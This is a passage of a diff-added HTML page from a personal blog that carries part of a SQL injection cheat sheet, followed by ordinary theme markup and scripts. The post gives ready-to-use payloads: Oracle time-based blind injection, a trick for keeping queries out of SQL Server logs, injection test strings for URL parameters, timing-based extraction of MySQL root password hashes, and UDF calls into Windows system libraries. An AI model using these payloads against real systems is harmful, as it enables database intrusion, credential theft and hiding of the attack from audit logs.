+<p>Sleep for supplied seconds.</p>
+<pre><code>(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message((&apos;xyz&apos;),10) ELSE dbms_pipe.receive_message((&apos;xyz&apos;),1) END FROM dual)
+
+{INJECTION} = You want to run the query.
+
+If the condition is true, will response after 10 seconds. If is false, will be delayed for one second.
+</code></pre><p>Covering Your Tracks<br>SQL Server -sp_password log bypass (S)</p>
+<p>SQL Server don’t log queries that includes sp_password for security reasons(!). So if you add –sp_password to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it’s possible)<br>Clear SQL Injection Tests</p>
+<p>These tests are simply good for blind sql injection and silent attacks.</p>
+<pre><code>product.asp?id=4 (SMO)
+    product.asp?id=5-1
+    product.asp?id=4 OR 1=1 
+
+product.asp?name=Book
+    product.asp?name=Bo’%2b’ok
+    product.asp?name=Bo’ || ’ok (OM)
+    product.asp?name=Book’ OR ‘x’=’x
+</code></pre><p>Extra MySQL Notes</p>
+<pre><code>Sub Queries are working only MySQL 4.1+
+Users
+    SELECT User,Password FROM mysql.user;
+SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=&apos;2&apos;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;
+SELECT ... INTO DUMPFILE
+    Write query into a new file (can not modify existing files)
+UDF Function
+    create function LockWorkStation returns integer soname &apos;user32&apos;;
+    select LockWorkStation(); 
+    create function ExitProcess returns integer soname &apos;kernel32&apos;;
+    select exitpro
+</code></pre>
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL-injection/" rel="tag">#SQL;injection</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/03/21/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/default_avatar.jpg"
+               alt="MengNan Li" />
+          <p class="site-author-name" itemprop="name">MengNan Li</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">2</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">categories</span>
+              
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        <div class="links-of-blogroll motion-element">
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator">
+            <i class="fa fa-angle-double-up"></i>
+          </div>
+          <div class="post-toc">
+            
+              
+            
+            
+              <p class="post-toc-empty">This post does not have a Table of Contents</p>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator">
+            <i class="fa fa-angle-double-down"></i>
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">MengNan Li</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+
+  
+
+
+
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=0.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=0.5.0"></script>
+
+
+
+  
+  
+
+  
+  
+<script type="text/javascript" src="/js/src/scrollspy.js?v=0.5.0"></script>
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 1 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = NexT.utils.escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    NexT.motion.middleWares.sidebar = function () {
+      var $tocContent = $('.post-toc-content');
+
+      if (CONFIG.sidebar.display === 'post' || CONFIG.sidebar.display === 'always') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          NexT.utils.displaySidebar();
+        }
+      }
+    };
+  });
+</script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=0.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+
+  
+
+
+</body>
+</html>
